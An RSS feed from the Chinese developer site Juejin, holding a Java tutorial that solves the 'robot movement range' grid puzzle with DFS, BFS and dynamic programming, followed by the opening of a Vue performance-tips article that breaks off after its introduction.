<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[剑指offer-66、机器⼈的运动范围]]></title>    <link>https://juejin.cn/post/7597278451030147082</link>    <guid>https://juejin.cn/post/7597278451030147082</guid>    <pubDate>2026-01-21T00:13:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451030147082" data-draft-id="7595800318519246854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 剑指offer-66、机器⼈的运动范围"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-21T00:13:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             剑指offer-66、机器⼈的运动范围
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:13:17.000Z" title="Wed Jan 21 2026 00:13:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">题目描述</h2>
<p>地上有⼀个 m ⾏和 n 列的⽅格。⼀个机器⼈从坐标（0,0） 的格⼦开始移动，每⼀次只能向左，右，上，下四个⽅向移动⼀格，但是不能进⼊⾏坐标和列坐标的数位之和⼤于 k 的格⼦。 例如，当k 为 18 时，机器⼈能够进⼊⽅格（35,37） ，因为 3+5+3+7 = 18 。但是，它不能进⼊⽅格（35,38） ，因为 3+5+3+8 = 19 。请问该机器⼈能够达到多少个格⼦？</p>
<p>示例1</p>
<p>输⼊：5,10,10
返回值：21</p>
<p>示例2</p>
<p>输⼊：10,1,100
返回值：29</p>
<p>说明：[0,0],[0,1],[0,2],[0,3],[0,4],[0,5],[0,6],[0,7],[0,8],[0,9],[0,10],[0,11],[0,12],[0,13],[0,14],[0,15],[0,16],[0,17],[0,18],[0,19],[0,20],[0,21],[0,22],[0,23],[0,24],[0,25],[0,26],[0,27],[0,28] 这29种，后⾯的[0,29] , [0,30] 以及[0,31] 等等是⽆法到达的。</p>
<h2 data-id="heading-1">思路及解答</h2>
<h3 data-id="heading-2">DFS（深度优先搜索）</h3>
<p>深度优先搜索算法，也就是 DFS ,⾸先需要初始化数组，注意是 boolean 类型的⼆元数组。边初始化
边计算位数的和，判断如果⼤于等于阈值的话，就直接置为 true ，也就是已经被访问到（但是这⼀部分计⼊结果）。</p>
<p>然后遍历每⼀个元素，只要 i ， j 不在合法的索引范围或者是已经被访问过，都会直接返回
false 。</p>
<p>否则的话，可访问的数量 +1 ，并且递归遍历上下左右四个元素，返回最终的可访问的个数。</p>
<p>DFS 会优先同⼀个⽅向，⼀直⾛下去，不撞南墙不回头，直到条件不满⾜的时候，才会回头。回头之后，每次只会回头⼀步，往另外⼀个⽅向去，同样是⼀头扎进去。</p>
<p>假设有⼀个 4 x 4 的⽅格，从第⼀个开始遍历，假设遍历顺序是上，右，下，左，那么遍历的顺序如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/392fc23287824ff3beb2bed62819573b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559196&amp;x-signature=YjKHxJafxIS%2BbTX6Pj91dUz40I4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">movingCount</span><span class="hljs-params">(<span class="hljs-type">int</span> threshold, <span class="hljs-type">int</span> rows, <span class="hljs-type">int</span> cols)</span> {
        <span class="hljs-keyword">if</span> (rows &gt; <span class="hljs-number">0</span> &amp;&amp; cols &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-type">boolean</span>[][] visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[rows][cols];
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rows; i++) {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; cols; j++) {
                    <span class="hljs-comment">// 如果⼤于阈值，设置已被访问过</span>
                    visited[i][j] = ((getSum(i) + getSum(j)) &gt; threshold);
                }
            }
            <span class="hljs-keyword">return</span> getNum(visited, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
   <span class="hljs-comment">// 获取可以被访问的个数</span>
   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getNum</span><span class="hljs-params">(<span class="hljs-type">boolean</span>[][] visited, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">int</span> count)</span> {
        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || j &lt; <span class="hljs-number">0</span> || i &gt;= visited.length || j &gt;= visited[<span class="hljs-number">0</span>].length ||
            visited[i][j]) {
            <span class="hljs-keyword">return</span> count;
        }
        count++;
        visited[i][j] = <span class="hljs-literal">true</span>;
        count = getNum(visited, i, j + <span class="hljs-number">1</span>, count);
        count = getNum(visited, i, j - <span class="hljs-number">1</span>, count);
        count = getNum(visited, i + <span class="hljs-number">1</span>, j, count);
        count = getNum(visited, i - <span class="hljs-number">1</span>, j, count);
        <span class="hljs-keyword">return</span> count;
   }
   
    <span class="hljs-comment">// 计算位数之和</span>
   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (num &gt; <span class="hljs-number">0</span>) {
            result = result + num % <span class="hljs-number">10</span>;
            num = num / <span class="hljs-number">10</span>;
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<ul>
<li>时间复杂度：最坏的情况是将所有的格⼦都遍历⼀遍， O(m*n) 。</li>
<li>空间复杂度：借助了额外的空间保存是否被访问过，同样为O(m*n) 。</li>
</ul>
<h3 data-id="heading-3">BFS（⼴度优先搜索）</h3>
<p>⼴度优先搜索，也就是没进⾏⼀步，优先搜索当前点的各个⽅向上的点，不急着往下搜索，等搜索完当前点的各个⽅向的点，再依次把之前搜索的点，取出来，同样先搜索周边的点...</p>
<p>这样直到所有都被搜索完成。</p>
<p>同样有⼀个 4 x 4 的⽅格，从第⼀个开始遍历，假设遍历顺序是上，右，下，左，那么遍历的顺序如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0baa3a35fab447f99749e11f86011974~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559196&amp;x-signature=zrTrnGeZob8bLf9SnzCcFgKc0Ng%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0d94609bdc340d99b5050d946922ad9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559196&amp;x-signature=sY8CvTimTpqRJcBkv2%2BUk7wWRQM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/227d9fc051564fe0b4d68fc3ec136f34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559196&amp;x-signature=OzEcV8UUAxLzaLvdmE3QYdPPSm4%3D" alt="" loading="lazy"/></p>
<p>在上⾯的过程图示中，我们可以发现，访问是有顺序的，每遍历⼀个新的⽅块，都会标⼀个顺序，然后按照顺序遍历其四个⽅向。</p>
<p>这也就是⼴度优先搜索的本质，我们需要⼀个队列，来保存遍历的顺序，每次都从队列⾥⾯取出⼀个位置，遍历其四周的⽅块，每次遍历到的点，都会放到队列⾥⾯，这样直到队列为空的时候，也就是全部遍历完成。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.LinkedList;
<span class="hljs-keyword">import</span> java.util.Queue;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution13</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">movingCount</span><span class="hljs-params">(<span class="hljs-type">int</span> threshold, <span class="hljs-type">int</span> rows, <span class="hljs-type">int</span> cols)</span> {
        <span class="hljs-type">boolean</span>[][] visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[rows][cols];
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        Queue&lt;<span class="hljs-type">int</span>[]&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
        <span class="hljs-comment">// 把第⼀个点加到队列⾥⾯</span>
        queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{<span class="hljs-number">0</span>, <span class="hljs-number">0</span>});
        
        <span class="hljs-keyword">while</span> (queue.size() &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// ⼀直取数据，直到队列为空</span>
            <span class="hljs-type">int</span>[] x = queue.poll();
            <span class="hljs-comment">// 取出来的数据，包含x，y坐标</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> x[<span class="hljs-number">0</span>], j = x[<span class="hljs-number">1</span>];
            <span class="hljs-comment">// 如果访问过或者不符合，直接下⼀个</span>
            <span class="hljs-keyword">if</span> (i &gt;= rows || j &gt;= cols || threshold &lt; getSum(i) + getSum(j) || visited[i][j]) <span class="hljs-keyword">continue</span>;
            
            <span class="hljs-comment">// 置为访问过</span>
            visited[i][j] = <span class="hljs-literal">true</span>;
            <span class="hljs-comment">// 数量增加</span>
            count++;
            <span class="hljs-comment">// 右</span>
            queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{i + <span class="hljs-number">1</span>, j});
            <span class="hljs-comment">// 下</span>
            queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{i, j + <span class="hljs-number">1</span>});
       }
       <span class="hljs-keyword">return</span> count;
   }
   
    <span class="hljs-comment">// 计算位数之和</span>
   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (num &gt; <span class="hljs-number">0</span>) {
            result = result + num % <span class="hljs-number">10</span>;
            num = num / <span class="hljs-number">10</span>;
        }
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<ul>
<li>时间复杂度：最坏的情况是将所有的格⼦都遍历⼀遍， O(m*n) 。</li>
<li>空间复杂度：借助了额外的空间保存是否被访问过，同样为O(m*n) 。</li>
</ul>
<h3 data-id="heading-4">动态规划（最优解）</h3>
<p>利用递推关系式，避免重复计算。</p>
<ul>
<li>格子(i,j)可达 ⇔ 数位和满足条件 ∧ (左边格子可达 ∨ 上边格子可达)</li>
<li>dp[i][j]表示(i,j)是否可达，基于左边和上边格子的状态：<code>dp[i][j] = (digitSum(i) + digitSum(j) ≤ k) &amp;&amp; (dp[i-1][j] || dp[i][j-1])</code></li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">movingCount</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> {
        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
        
        <span class="hljs-comment">// dp[i][j]表示格子(i,j)是否可达</span>
        <span class="hljs-type">boolean</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[m][n];
        dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 起点可达</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;     <span class="hljs-comment">// 起点已计入</span>
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; m; i++) {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; n; j++) {
                <span class="hljs-comment">// 跳过起点和数位和超限的情况</span>
                <span class="hljs-keyword">if</span> ((i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) || digitSum(i) + digitSum(j) &gt; k) {
                    <span class="hljs-keyword">continue</span>;
                }
                
                <span class="hljs-comment">// 检查是否可以从左边或上边到达当前格子</span>
                <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) {
                    dp[i][j] |= dp[i - <span class="hljs-number">1</span>][j];  <span class="hljs-comment">// 从上边来</span>
                }
                <span class="hljs-keyword">if</span> (j - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) {
                    dp[i][j] |= dp[i][j - <span class="hljs-number">1</span>];  <span class="hljs-comment">// 从左边来</span>
                }
                
                <span class="hljs-comment">// 如果当前格子可达，计数加1</span>
                count += dp[i][j] ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;
            }
        }
        
        <span class="hljs-keyword">return</span> count;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">digitSum</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (num &gt; <span class="hljs-number">0</span>) {
            sum += num % <span class="hljs-number">10</span>;
            num /= <span class="hljs-number">10</span>;
        }
        <span class="hljs-keyword">return</span> sum;
    }
}
</code></pre>
<ul>
<li><strong>时间复杂度</strong>：O(mn)，双重循环遍历所有格子</li>
<li><strong>空间复杂度</strong>：O(mn)，dp数组的空间</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue项目性能提升50%？这5个优化技巧90%开发者都忽略了]]></title>    <link>https://juejin.cn/post/7597311768729714688</link>    <guid>https://juejin.cn/post/7597311768729714688</guid>    <pubDate>2026-01-21T00:16:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597311768729714688" data-draft-id="7597283981185515572" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue项目性能提升50%？这5个优化技巧90%开发者都忽略了"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-01-21T00:16:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue项目性能提升50%？这5个优化技巧90%开发者都忽略了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:16:50.000Z" title="Wed Jan 21 2026 00:16:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue项目性能提升50%？这5个优化技巧90%开发者都忽略了</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>在当今前端开发领域，Vue.js因其简洁的API和灵活的架构而广受欢迎。然而，随着应用规模的扩大，许多Vue项目都会面临性能瓶颈的问题。令人惊讶的是，许多常见的性能优化机会往往被大多数开发者忽视。本文将深入探讨5个被90%开发者忽略的关键优化技巧，这些方法可能帮助你的Vue应用性能提升高达50%。我们将从编译时优化、运行时优化、懒加载策略、状态管理最佳实践和渲染优化等多个维度进行分析。</p>
<h2 data-id="heading-2">主体内容</h2>
<h3 data-id="heading-3">1. 编译时优化：合理配置Webpack/Babel</h3>
<p>大多数Vue项目通过Vue CLI创建后直接使用默认配置，但这可能不是最优选择。</p>
<h4 data-id="heading-4">a. 生产环境去除console.log</h4>
